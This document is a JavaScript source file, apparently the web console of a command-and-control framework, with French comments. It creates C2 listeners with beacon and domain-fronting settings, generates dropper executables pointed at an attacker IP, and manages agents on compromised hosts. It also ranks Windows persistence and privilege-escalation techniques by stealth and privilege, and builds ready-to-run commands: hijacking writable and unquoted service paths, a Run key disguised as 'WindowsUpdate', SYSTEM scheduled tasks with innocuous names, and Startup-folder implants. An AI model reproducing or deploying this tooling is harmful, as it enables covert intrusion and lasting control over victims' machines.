    const currentValue = targetListenerEl.value;
    const nextValue = preferredListenerId || currentValue || "";
    targetListenerEl.innerHTML = "";

    const placeholder = document.createElement("option");
    placeholder.value = "";
    placeholder.textContent = cachedListeners.length ? "Select a listener" : "No listeners available";
    targetListenerEl.appendChild(placeholder);

    cachedListeners.forEach((listener) => {
        if (!listener?.listener_id) return;
        const option = document.createElement("option");
        option.value = listener.listener_id;
        option.textContent = formatPayloadListenerOption(listener);
        targetListenerEl.appendChild(option);
    });

    const hasMatch = nextValue && cachedListeners.some((listener) => listener.listener_id === nextValue);
    targetListenerEl.value = hasMatch ? nextValue : "";
    targetListenerEl.disabled = cachedListeners.length === 0;
}

function syncPayloadServerIpFromSelectedListener(options = {}) {
    const { force = false } = options;
    const targetListenerEl = document.getElementById("payload-target-listener");
    const serverIpEl = document.getElementById("payload-server-ip");
    const listenerIdEl = document.getElementById("payload-listener-id");
    const previewEl = document.getElementById("payload-preview-json");
    
    if (!targetListenerEl || !serverIpEl || !listenerIdEl) return;

    const selectedListener = cachedListeners.find((listener) => listener.listener_id === targetListenerEl.value);
    
    // MODIFIER ICI - Utiliser l'IP détectée
    let nextIp = String(selectedListener?.host || "").trim();
    if (!nextIp || nextIp === "0.0.0.0" || nextIp === "127.0.0.1") {
        nextIp = DETECTED_C2_IP || "192.168.1.149";  // ← CHANGÉ
    }
    
    const nextListenerId = String(selectedListener?.listener_id || "").trim();

    if (force || !serverIpEl.value.trim() || serverIpEl.value.trim() === "0.0.0.0") {
        serverIpEl.value = nextIp;
    }
    
    if (force || !listenerIdEl.value.trim()) {
        listenerIdEl.value = nextListenerId;
    }

    if (previewEl && serverIpEl.value && listenerIdEl.value) {
        const preview = {
            server_ip: serverIpEl.value,
            listener_id: listenerIdEl.value,
            generated_at: new Date().toISOString()
        };
        previewEl.value = JSON.stringify(preview, null, 2);
    }
}

async function openPayloadModal() {
    const modal = document.getElementById("payload-modal");
    if (!modal) return;

    modal.classList.add("active");
    modal.style.display = "grid";

    if (!cachedListeners.length) {
        await loadListeners();
    }

    const nameEl = document.getElementById("payload-name");
    const targetListenerEl = document.getElementById("payload-target-listener");
    const serverIpEl = document.getElementById("payload-server-ip");
    const listenerIdEl = document.getElementById("payload-listener-id");
    const previewEl = document.getElementById("payload-preview-json");

    if (nameEl) {
        nameEl.value = `Payload-${new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-")}`;
    }

    populatePayloadListenerSelect(selectedListenerId);

    if (targetListenerEl && selectedListenerId && cachedListeners.some(l => l.listener_id === selectedListenerId)) {
        targetListenerEl.value = selectedListenerId;
        const selectedListener = cachedListeners.find(l => l.listener_id === selectedListenerId);
        if (selectedListener) {
            if (listenerIdEl) {
                listenerIdEl.value = selectedListener.listener_id;
            }
            if (serverIpEl) {
                serverIpEl.value = selectedListener.host || "127.0.0.1";
            }
        }
    } else {
        if (listenerIdEl) listenerIdEl.value = "";
        if (serverIpEl) serverIpEl.value = "";
    }

    // Mettre à jour le preview
    if (previewEl && targetListenerEl && serverIpEl && listenerIdEl) {
        const preview = {
            server_ip: serverIpEl.value,
            listener_id: listenerIdEl.value,
            generated_at: new Date().toISOString()
        };
        previewEl.value = JSON.stringify(preview, null, 2);
    }

    addConsoleLog("[*] Payload modal opened", "info");
}

function closePayloadModal() {
    const modal = document.getElementById("payload-modal");
    if (!modal) return;
    modal.classList.remove("active");
    // In case the modal was force-opened via inline styles
    modal.style.display = "none";
}

function downloadTextFile(filename, text) {
    const blob = new Blob([text], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
}

function getAttachmentFilename(response, fallbackName) {
    const disposition = response.headers.get("Content-Disposition") || "";
    const match = disposition.match(/filename="?([^"]+)"?/i);
    return match?.[1] || fallbackName;
}

async function generateDropper() {
    const nameEl = document.getElementById("payload-name");
    const targetListenerEl = document.getElementById("payload-target-listener");
    const serverIpEl = document.getElementById("payload-server-ip");
    const listenerIdEl = document.getElementById("payload-listener-id");

    if (!nameEl || !targetListenerEl || !serverIpEl || !listenerIdEl) {
        addConsoleLog("[-] Missing form fields", "error");
        return;
    }

    const name = (nameEl.value || "").trim();
    const targetListenerId = (targetListenerEl.value || "").trim();
    
    // ============================================================
    // CORRECTION IP - FORCER LA BONNE IP AUTOMATIQUEMENT
    // ============================================================
    let serverIp = (serverIpEl.value || "").trim();
    
    // Si l'IP est invalide (0.0.0.0, 127.0.0.1, localhost ou vide), utiliser l'IP détectée
    if (!serverIp || serverIp === "0.0.0.0" || serverIp === "127.0.0.1" || serverIp === "localhost") {
        // Utiliser l'IP détectée par detectC2ServerIP()
        if (typeof DETECTED_C2_IP !== 'undefined' && DETECTED_C2_IP) {
            serverIp = DETECTED_C2_IP;
        } else {
            // Fallback: demander à l'utilisateur
            serverIp = prompt("Entrez l'IP du serveur C2 (Kali):", "192.168.1.149");
            if (!serverIp) {
                addConsoleLog("[-] Server IP is required", "error");
                return;
            }
        }
        serverIpEl.value = serverIp;
        addConsoleLog(`[*] IP automatique utilisée: ${serverIp}`, "info");
    }

    if (!name) {
        addConsoleLog("[-] Payload name is required", "error");
        return;
    }
    if (!targetListenerId) {
        addConsoleLog("[-] Please select a listener", "error");
        return;
    }

    // Récupérer le listener ID depuis l'objet listener sélectionné
    const selectedListener = cachedListeners.find(l => l.listener_id === targetListenerId);
    const listenerId = selectedListener ? selectedListener.listener_id : targetListenerId;

    addConsoleLog(`[*] Generating dropper for ${serverIp} / ${listenerId}`, "info");

    try {
        const response = await fetch(`${API}/dropper/generate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                server_ip: serverIp,
                listener_id: listenerId,
                payload_name: name
            })
        });

        if (!response.ok) {
            let message = response.statusText;
            try {
                const errorText = await response.text();
                if (errorText.trim()) {
                    try {
                        const error = JSON.parse(errorText);
                        message = error.detail || errorText.trim();
                    } catch (parseError) {
                        message = errorText.trim();
                    }
                }
            } catch (parseError) {
                // keep default status text if the response body cannot be read
            }
            addConsoleLog(`[-] Generation failed: ${message}`, "error");
            return;
        }

        // Télécharger le fichier
        const outputType = response.headers.get("X-Dropper-Output-Type") || "exe";
        const reason = response.headers.get("X-Dropper-Reason") || "";
        const fallbackExt = outputType === "source" ? "c" : "exe";
        const fallbackName = `dropper_${name.replace(/[^a-zA-Z0-9_-]/g, "_")}.${fallbackExt}`;
        const filename = getAttachmentFilename(response, fallbackName);
        const blob = await response.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(url);

        if (outputType === "source") {
            const reasonText = reason ? ` (${reason})` : "";
            addConsoleLog(`[+] Dropper source generated successfully: ${filename}${reasonText}`, "success");
            toast("Compiler missing: C source downloaded", "info");
        } else {
            addConsoleLog(`[+] Dropper generated successfully: ${filename}`, "success");
            toast("Dropper downloaded", "success");
        }
        closePayloadModal();

    } catch (e) {
        addConsoleLog(`[-] Generation error: ${e.message}`, "error");
    }
}

// Ensure functions are available from inline HTML handlers
window.openPayloadModal = openPayloadModal;
window.closePayloadModal = closePayloadModal;
window.createPayloadProfile = createPayloadProfile;

async function createListener() {
    const existingId = (document.getElementById("listener-id").value || "").trim();
    const name = document.getElementById("listener-name").value.trim();
    const protocol = document.getElementById("listener-protocol").value;
    const profile = document.getElementById("listener-profile").value;
    const host = document.getElementById("listener-host").value.trim() || "127.0.0.1";
    const port = parseInt(document.getElementById("listener-port").value, 10);
    const use_ssl = document.getElementById("listener-ssl").checked;
    const beacon_interval = parseInt(document.getElementById("listener-interval").value, 10);
    const user_agent = document.getElementById("listener-ua").value.trim();
    const domain_front = document.getElementById("listener-domain-front").value.trim();
    const configJsonRaw = document.getElementById("listener-config-json").value.trim();
    let config = {};

    if (!name) {
        addConsoleLog("[-] listener name is required", "error");
        return;
    }
    if (!Number.isInteger(port) || port <= 0 || port > 65535) {
        addConsoleLog("[-] invalid listener port", "error");
        return;
    }
    if (!Number.isInteger(beacon_interval) || beacon_interval <= 0) {
        addConsoleLog("[-] invalid beacon interval", "error");
        return;
    }
    if (configJsonRaw) {
        try {
            config = JSON.parse(configJsonRaw);
        } catch (e) {
            addConsoleLog(`[-] invalid config JSON: ${e.message}`, "error");
            return;
        }
    }

    try {
        const isEdit = Boolean(existingId);
        const url = isEdit ? `${API}/listeners/${encodeURIComponent(existingId)}` : `${API}/listeners/`;
        const method = isEdit ? "PUT" : "POST";
        const res = await fetch(url, {
            method,
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                name,
                protocol,
                host,
                port,
                profile,
                use_ssl,
                beacon_interval,
                user_agent: user_agent || undefined,
                domain_front: domain_front || undefined,
                config
            })
        });

        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] listener save failed: ${data.detail || res.statusText}`, "error");
            return;
        }

        addConsoleLog(isEdit ? `[+] listener updated: ${data.name} (${data.listener_id})` : `[+] listener created: ${data.name} (${data.listener_id})`, "success");
        toast(isEdit ? "Listener updated" : "Listener created", "success");
        closeListenerModal();
        selectedListenerId = data.listener_id || selectedListenerId;
        storeSelectedListenerId(selectedListenerId);
        await loadListeners();
        renderListenersTable();
        await loadAuditReports({ silent: true });
        switchBottomTab("listeners");
    } catch (e) {
        addConsoleLog(`[-] create listener error: ${e.message}`, "error");
    }
}

async function startSelectedListener() {
    if (!selectedListenerId) {
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(selectedListenerId)}/start`, { method: "POST" });
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] start failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        addConsoleLog(`[+] listener started: ${selectedListenerId}`, "success");
        toast("Listener started", "success");
        await loadListeners();
        renderListenersTable();
        await loadAuditReports({ silent: true });
    } catch (e) {
        addConsoleLog(`[-] start error: ${e.message}`, "error");
    }
}

async function stopSelectedListener() {
    if (!selectedListenerId) {
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(selectedListenerId)}/stop`, { method: "POST" });
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] stop failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        addConsoleLog(`[+] listener stopped: ${selectedListenerId}`, "success");
        toast("Listener stopped", "success");
        await loadListeners();
        renderListenersTable();
        await loadAuditReports({ silent: true });
    } catch (e) {
        addConsoleLog(`[-] stop error: ${e.message}`, "error");
    }
}

async function showSelectedListenerStats() {
    if (!selectedListenerId) {
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(selectedListenerId)}/stats`);
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] stats failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        addConsoleLog(`[*] listener stats: ${data.name} (${data.listener_id})`, "info");
        addConsoleLog(`    endpoint: ${data.endpoint}`, "info");
        addConsoleLog(`    stats: ${JSON.stringify(data.stats || {}, null, 2)}`, "info");
    } catch (e) {
        addConsoleLog(`[-] stats error: ${e.message}`, "error");
    }
}

async function exportSelectedListener() {
    if (!selectedListenerId) {
        addConsoleLog("[-] select a listener first", "error");
        return;
    }
    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(selectedListenerId)}/export`);
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] export failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        const txt = data.profile_json || "";
        addConsoleLog(`[*] export (copy/paste):`, "info");
        addConsoleLog(txt, "info");
        if (navigator.clipboard && txt) {
            await navigator.clipboard.writeText(txt);
            toast("Export copied to clipboard", "info");
        }
    } catch (e) {
        addConsoleLog(`[-] export error: ${e.message}`, "error");
    }
}

async function removeSelectedListener() {
    if (!selectedListenerId) return;
    if (!confirm(`Remove listener ${selectedListenerId}?`)) return;
    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(selectedListenerId)}`, { method: "DELETE" });
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] remove failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        addConsoleLog(`[+] listener removed: ${selectedListenerId}`, "success");
        toast("Listener removed", "success");
        selectedListenerId = null;
        storeSelectedListenerId(null);
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
        await loadListeners();
        renderListenersTable();
        await loadAuditReports({ silent: true });
    } catch (e) {
        addConsoleLog(`[-] remove error: ${e.message}`, "error");
    }
}

async function showAgentDetails(agentId) {
    try {
        const res = await fetch(`${API}/agents/${agentId}`);
        const agent = await res.json();
        currentAgent = agent;
        const body = document.getElementById("modal-body");
        body.innerHTML = `
            <div class="detail-row"><div class="detail-label">Agent ID</div><div class="detail-value">${agent.agent_id ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">Hostname</div><div class="detail-value">${agent.hostname ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">Username</div><div class="detail-value">${agent.username ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">IP</div><div class="detail-value">${agent.ip_address ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">OS</div><div class="detail-value">${agent.operating_system ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">Status</div><div class="detail-value">${agent.status ?? "-"}</div></div>
            <div class="detail-row"><div class="detail-label">Last seen</div><div class="detail-value">${agent.last_seen ?? "-"}</div></div>
        `;
        document.getElementById("agent-modal").classList.add("active");
    } catch (e) {
        addConsoleLog(`[-] details fetch failed: ${e.message}`, "error");
    }
}

function closeModal() {
    document.getElementById("agent-modal").classList.remove("active");
    currentAgent = null;
}

async function killAgent() {
    if (!currentAgent) return;
    try {
        const res = await fetch(`${API}/agents/${encodeURIComponent(currentAgent.agent_id)}`, { method: "DELETE" });
        const data = await res.json();
        if (!res.ok) {
            addConsoleLog(`[-] remove agent failed: ${data.detail || res.statusText}`, "error");
            return;
        }
        addConsoleLog(`[+] simulated agent removed: ${currentAgent.agent_id?.slice(0, 8)}`, "success");
        closeModal();
        await loadAgents();
    } catch (e) {
        addConsoleLog(`[-] remove agent error: ${e.message}`, "error");
    }
}

function setupSortableTables() {
    document.querySelectorAll("table thead th[data-sort-key]").forEach((th) => {
        th.addEventListener("click", () => {
            const table = th.closest("table");
            const key = parseInt(th.dataset.sortKey, 10);
            sortTableByColumn(table, key);
        });
    });
}

function sortTableByColumn(table, column) {
    const tbody = table?.querySelector("tbody");
    if (!tbody) return;
    const rows = Array.from(tbody.querySelectorAll("tr")).filter(r => !r.classList.contains("loading"));
    if (!rows.length) return;
    const asc = !(table.dataset.sortAsc === "true");
    rows.sort((a, b) => {
        const av = (a.children[column]?.textContent || "").trim().toLowerCase();
        const bv = (b.children[column]?.textContent || "").trim().toLowerCase();
        const an = Number(av);
        const bn = Number(bv);
        if (!Number.isNaN(an) && !Number.isNaN(bn)) return asc ? an - bn : bn - an;
        return asc ? av.localeCompare(bv) : bv.localeCompare(av);
    });
    tbody.innerHTML = "";
    rows.forEach(r => tbody.appendChild(r));
    table.dataset.sortAsc = asc ? "true" : "false";
}

function openCmdk() {
    const modal = document.getElementById("cmdk-modal");
    if (!modal) return;
    modal.classList.add("active");
    const input = document.getElementById("cmdk-input");
    if (input) {
        input.value = "";
        activeCmdkIndex = 0;
        renderCmdkList();
        setTimeout(() => input.focus(), 0);
    }
}

function closeCmdk() {
    const modal = document.getElementById("cmdk-modal");
    if (modal) modal.classList.remove("active");
}

function renderCmdkList() {
    const input = document.getElementById("cmdk-input");
    const list = document.getElementById("cmdk-list");
    if (!input || !list) return;
    const q = input.value.trim().toLowerCase();
    const filtered = CMDK_ACTIONS.filter(a => a.label.toLowerCase().includes(q));
    if (activeCmdkIndex >= filtered.length) activeCmdkIndex = 0;
    list.innerHTML = "";
    filtered.forEach((a, idx) => {
        const item = document.createElement("div");
        item.className = `cmdk-item${idx === activeCmdkIndex ? " active" : ""}`;
        item.textContent = a.label;
        item.addEventListener("click", () => {
            a.run();
            closeCmdk();
            toast(a.label, "info");
        });
        list.appendChild(item);
    });
}

function onCmdkKeydown(e) {
    const input = document.getElementById("cmdk-input");
    const q = (input?.value || "").trim().toLowerCase();
    const filtered = CMDK_ACTIONS.filter(a => a.label.toLowerCase().includes(q));
    if (!filtered.length) return;
    if (e.key === "ArrowDown") {
        e.preventDefault();
        activeCmdkIndex = (activeCmdkIndex + 1) % filtered.length;
        renderCmdkList();
    } else if (e.key === "ArrowUp") {
        e.preventDefault();
        activeCmdkIndex = (activeCmdkIndex - 1 + filtered.length) % filtered.length;
        renderCmdkList();
    } else if (e.key === "Enter") {
        e.preventDefault();
        filtered[activeCmdkIndex].run();
        closeCmdk();
        toast(filtered[activeCmdkIndex].label, "info");
    }
}
// ============================================================
// SYSTÈME DE SCORING DYNAMIQUE (SANS IA)
// ============================================================

const SCORING_WEIGHTS = {
    PRIVILEGE: 35,
    PERSISTENCE: 25,
    STEALTH: 20,
    RELIABILITY: 10,
    SPEED: 10
};

const PRIVILEGE_SCORES = {
    "SYSTEM": 35,
    "ADMIN": 25,
    "USER": 15,
    "UNKNOWN": 5
};

const PERSISTENCE_SCORES = {
    "SURVIVES_REBOOT": 25,
    "SESSION_ONLY": 10,
    "ONE_TIME": 0
};

const STEALTH_SCORES = {
    "NO_FILE": 20,
    "HIDDEN_FILE": 15,
    "VISIBLE_FILE": 8,
    "LOUD": 3
};

const RELIABILITY_SCORES = {
    "HIGH": 10,
    "MEDIUM": 7,
    "LOW": 4,
    "UNKNOWN": 2
};

const SPEED_SCORES = {
    "INSTANT": 10,
    "REBOOT": 6,
    "DELAYED": 3,
    "SLOW": 1
};

const TECHNIQUE_DATABASE = {
    "Writable Service (SYSTEM)": {
        privilege: "SYSTEM",
        persistence: "SURVIVES_REBOOT",
        stealth: "HIDDEN_FILE",
        reliability: "HIGH",
        speed: "REBOOT"
    },
    "Writable Service (USER)": {
        privilege: "USER",
        persistence: "SURVIVES_REBOOT",
        stealth: "HIDDEN_FILE",
        reliability: "MEDIUM",
        speed: "REBOOT"
    },
    "Unquoted Service Path": {
        privilege: "SYSTEM",
        persistence: "SURVIVES_REBOOT",
        stealth: "VISIBLE_FILE",
        reliability: "MEDIUM",
        speed: "REBOOT"
    },
    "Registry Run Key (Admin)": {
        privilege: "ADMIN",
        persistence: "SURVIVES_REBOOT",
        stealth: "VISIBLE_FILE",
        reliability: "HIGH",
        speed: "INSTANT"
    },
    "Registry Run Key (User)": {
        privilege: "USER",
        persistence: "SURVIVES_REBOOT",
        stealth: "VISIBLE_FILE",
        reliability: "HIGH",
        speed: "INSTANT"
    },
    "Scheduled Task (SYSTEM)": {
        privilege: "SYSTEM",
        persistence: "SURVIVES_REBOOT",
        stealth: "HIDDEN_FILE",
        reliability: "HIGH",
        speed: "REBOOT"
    },
    "Scheduled Task (User)": {
        privilege: "USER",
        persistence: "SURVIVES_REBOOT",
        stealth: "VISIBLE_FILE",
        reliability: "MEDIUM",
        speed: "REBOOT"
    },
    "Startup Folder": {
        privilege: "USER",
        persistence: "SURVIVES_REBOOT",
        stealth: "VISIBLE_FILE",
        reliability: "MEDIUM",
        speed: "REBOOT"
    }
};

function calculateDynamicScore(techniqueName, context) {
    const tech = TECHNIQUE_DATABASE[techniqueName];
    if (!tech) return 50;
    
    let score = 0;
    score += PRIVILEGE_SCORES[tech.privilege] || 5;
    score += PERSISTENCE_SCORES[tech.persistence] || 5;
    score += STEALTH_SCORES[tech.stealth] || 5;
    score += RELIABILITY_SCORES[tech.reliability] || 5;
    score += SPEED_SCORES[tech.speed] || 5;
    
    if (context && context.isAdmin === false && tech.privilege === "SYSTEM") {
        score -= 10;
    }
    
    if (context && context.hasEDR === true && tech.stealth === "VISIBLE_FILE") {
        score -= 15;
    }
    
    return Math.min(100, Math.max(0, score));
}

function getRiskLevelFromScore(score) {
    if (score >= 80) return "critical";
    if (score >= 60) return "high";
    if (score >= 40) return "medium";
    return "low";
}

function getMitreId(techniqueId) {
    const mitreMap = {
        "service": "T1543.003",
        "schtask": "T1053.005",
        "reg": "T1547.001",
        "startup": "T1547.001",
        "dll": "T1574.009"
    };
    return mitreMap[techniqueId] || "T1xxx.xxx";
}

// ============================================================
// RECOMMANDATIONS AVEC SCORING DYNAMIQUE
// ============================================================

document.addEventListener('DOMContentLoaded', function() {
    const recTab = document.getElementById('tab-recommendations');
    if (!recTab) return;
    
    recTab.removeAttribute('onclick');
    
    recTab.addEventListener('click', function(e) {
        e.preventDefault();
        
        document.querySelectorAll('.bottom-tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        const recView = document.getElementById('recommendations-view');
        if (recView) recView.classList.add('active');
        
        const auditReport = window.selectedAuditReportDetail;
        
        if (!auditReport || !auditReport.report_json) {
            document.getElementById('recommendations-summary').innerHTML = '<h4>⚠️ No audit report selected</h4><p>Go to Enumeration Results and select a report first.</p>';
            document.getElementById('recommendations-list').innerHTML = '';
            return;
        }
        
        const auditData = JSON.parse(auditReport.report_json);
        const system = auditData.system || {};
        const findings = auditData.findings || [];
        const isAdmin = system.IsAdministrator || false;
        const username = system.UserName || 'user';
        const hostname = system.MachineName || 'Unknown';
        
        const context = {
            isAdmin: isAdmin,
            hasEDR: false,
            findingsCount: findings.length
        };
        
        const writableServices = [];
        const unquotedServices = [];
        
        for (let i = 0; i < findings.length; i++) {
            const finding = findings[i];
            const type = finding.type || '';
            if (type.indexOf('Writable Service') !== -1) {
                writableServices.push({
                    name: finding.target.split('(')[0].trim(),
                    path: finding.evidencePath,
                    principal: finding.principal || 'SYSTEM'
                });
            }
            if (type.indexOf('Unquoted Service Path') !== -1) {
                unquotedServices.push({
                    name: finding.target.split('(')[0].trim(),
                    path: finding.evidencePath
                });
            }
        }
        
        const recommendations = [];
        
        for (let i = 0; i < writableServices.length; i++) {
            const svc = writableServices[i];
            const techniqueName = svc.principal === "SYSTEM" ? "Writable Service (SYSTEM)" : "Writable Service (USER)";
            const score = calculateDynamicScore(techniqueName, context);
            recommendations.push({
                technique: "service",
                score: score,
                risk: getRiskLevelFromScore(score),
                mitre: "T1543.003",
                reason: `Service '${svc.name}' is WRITABLE! Runs as ${svc.principal}.`,
                command: fixCommandIP(`copy "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" "${svc.path}" /Y && net stop "${svc.name}" && net start "${svc.name}"`)
            });
        }
        
        for (let i = 0; i < unquotedServices.length; i++) {
            const svc = unquotedServices[i];
            const score = calculateDynamicScore("Unquoted Service Path", context);
            const pathParts = svc.path.split('\\');
            let vulnerablePath = "";
            for (let j = 0; j < pathParts.length; j++) {
                vulnerablePath += pathParts[j] + "\\";
                if (pathParts[j].indexOf(' ') !== -1) break;
            }
            vulnerablePath = vulnerablePath.replace(/\\$/, '');
            recommendations.push({
                technique: "dll",
                score: score,
                risk: getRiskLevelFromScore(score),
                mitre: "T1574.009",
                reason: `Service '${svc.name}' has unquoted path.`,
                command: `copy "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" "${vulnerablePath}.exe" /Y && sc stop "${svc.name}" && sc start "${svc.name}"`
            });
        }
        
        const regTechnique = isAdmin ? "Registry Run Key (Admin)" : "Registry Run Key (User)";
        const regScore = calculateDynamicScore(regTechnique, context);
        recommendations.push({
            technique: "reg",
            score: regScore,
            risk: getRiskLevelFromScore(regScore),
            mitre: "T1547.001",
            reason: "Registry Run Key - Simple persistence that survives reboots.",
            command: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" /f`
        });
        
        const schTaskTechnique = isAdmin ? "Scheduled Task (SYSTEM)" : "Scheduled Task (User)";
        const schTaskScore = calculateDynamicScore(schTaskTechnique, context);
        recommendations.push({
            technique: "schtask",
            score: schTaskScore,
            risk: getRiskLevelFromScore(schTaskScore),
            mitre: "T1053.005",
            reason: isAdmin ? "Scheduled Task - Runs as SYSTEM." : "Scheduled Task (User level).",
            command: isAdmin 
                ? `schtasks /create /tn "SystemHealthCheck" /tr "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "SYSTEM" /f`
                : `schtasks /create /tn "UserUpdate" /tr "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "${username}" /f`
        });
        
        const startupScore = calculateDynamicScore("Startup Folder", context);
        recommendations.push({
            technique: "startup",
            score: startupScore,
            risk: getRiskLevelFromScore(startupScore),
            mitre: "T1547.001",
            reason: "Startup Folder - Simple but visible.",
            command: `copy "C:\\Users\\${username}\\Desktop\\Agent\\MyAgent.exe" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"`
        });
        
        recommendations.sort((a, b) => b.score - a.score);
        
        let criticalCount = 0, highCount = 0;
        for (let i = 0; i < recommendations.length; i++) {
            if (recommendations[i].risk === 'critical') criticalCount++;
            if (recommendations[i].risk === 'high') highCount++;
        }
        
        const summaryDiv = document.getElementById('recommendations-summary');
        summaryDiv.innerHTML = 
            '<div style="background: linear-gradient(135deg, #1a2a46 0%, #0f1a2e 100%); padding: 12px; border-radius: 8px; margin-bottom: 12px;">' +
            '<h4 style="margin: 0 0 8px 0;">📊 ' + hostname + '\\' + username + '</h4>' +
            '<div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; font-size: 11px;">' +
            '<span>👑 Admin: <strong>' + (isAdmin ? 'YES' : 'NO') + '</strong></span>' +
            '<span>🔍 Findings: <strong>' + findings.length + '</strong></span>' +
            '<span>🎯 Best score: <strong style="color: #4caf50;">' + recommendations[0].score + '%</strong></span>' +
            '</div>' +
            '<div style="margin-top: 8px; font-size: 10px; color: #aaa;">' +
            '🔴 Critical: ' + criticalCount + ' | 🟠 High: ' + highCount +
            '</div>' +
            '</div>';
        
        const listDiv = document.getElementById('recommendations-list');
        listDiv.innerHTML = '<div style="background: #0d1118; padding: 8px; margin-bottom: 12px; border-radius: 6px; font-size: 10px; text-align: center; border: 1px solid #2e374a;">' +
            '📊 <strong>Scoring system</strong>: ' +
            'Privilege (35) + Persistence (25) + Stealth (20) + Reliability (10) + Speed (10) = 0-100%' +
            '</div>';
        
        for (let i = 0; i < recommendations.length; i++) {
            const rec = recommendations[i];
            const scoreColor = rec.score >= 80 ? '#ef4444' : (rec.score >= 60 ? '#f97316' : (rec.score >= 40 ? '#eab308' : '#22c55e'));
            const html = '<div class="recommendation-card ' + rec.risk + '" style="margin-bottom: 10px; border-left: 4px solid ' + scoreColor + '; background: #0d1118; border-radius: 6px; padding: 10px;">' +
                '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">' +
                '<span style="font-family: monospace; font-size: 11px; font-weight: bold; color: #7dcfff;">🔧 ' + rec.technique.toUpperCase() + '</span>' +
                '<span style="display: inline-flex; gap: 6px;">' +
                '<span style="font-size: 9px; background: #1a2a46; padding: 2px 6px; border-radius: 10px;">🎯 ' + rec.mitre + '</span>' +
                '<span style="font-family: monospace; font-size: 10px; font-weight: bold; background: ' + scoreColor + '20; color: ' + scoreColor + '; padding: 2px 8px; border-radius: 12px;">Score: ' + rec.score + '% ' + (i === 0 ? '🏆' : '') + '</span>' +
                '</span>' +
                '</div>' +
                '<div style="display: flex; gap: 8px; margin-bottom: 6px;">' +
                '<span style="background: ' + scoreColor + '20; color: ' + scoreColor + '; padding: 1px 6px; border-radius: 8px; font-size: 9px;">' + rec.risk.toUpperCase() + '</span>' +
                '</div>' +
                '<div style="font-size: 9px; color: #b6bfd3; margin-bottom: 6px;">💡 ' + rec.reason + '</div>' +
                '<div style="font-family: monospace; font-size: 8px; background: #0d1118; border: 1px solid #2e374a; border-radius: 4px; padding: 6px; color: #9ad0ff; word-break: break-all; overflow-x: auto;">' +
                '<span style="color: #6b8cae;">$</span> ' + rec.command +
                '</div>' +
                '</div>';
            listDiv.innerHTML += html;
        }
    });
});
// ============================================================
// VULNERABILITY GRAPH VIEW - CORRIGÉ
// ============================================================

var radarChart = null;
var doughnutChart = null;

function initVulnerabilityTab() {
    var tab = document.getElementById('tab-vulnerability');
    if (!tab) return;
    
    // Supprimer tous les listeners existants
    var newTab = tab.cloneNode(true);
    tab.parentNode.replaceChild(newTab, tab);
    
    newTab.onclick = function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        // CHANGER UNIQUEMENT L'ONGLET ACTIF
        document.querySelectorAll('.bottom-tab').forEach(function(t) { 
            t.classList.remove('active'); 
        });
        this.classList.add('active');
        
        // CACHER TOUTES LES VUES
        document.querySelectorAll('.view').forEach(function(v) { 
            v.classList.remove('active');
            v.style.display = 'none';
        });
        
        // AFFICHER UNIQUEMENT LA VUE VULNÉRABILITÉS
        var vulnView = document.getElementById('vulnerability-view');
        if (vulnView) {
            vulnView.classList.add('active');
            vulnView.style.display = 'block';
        }
        
        // FORCER LE MASQUAGE DES AUTRES VUES
        var recView = document.getElementById('recommendations-view');
        if (recView) {
            recView.classList.remove('active');
            recView.style.display = 'none';
        }
        
        // CHARGER LES DONNÉES DE VULNÉRABILITÉ
        var auditReport = window.selectedAuditReportDetail;
        if (auditReport && auditReport.report_json) {
            try {
                var auditData = JSON.parse(auditReport.report_json);
                renderVulnerabilityGraphs(auditData);
            } catch(err) {
                console.error('Erreur parsing audit report:', err);
                showNoAuditReportMessage();
            }
        } else {
            showNoAuditReportMessage();
        }
    };
}

function showNoAuditReportMessage() {
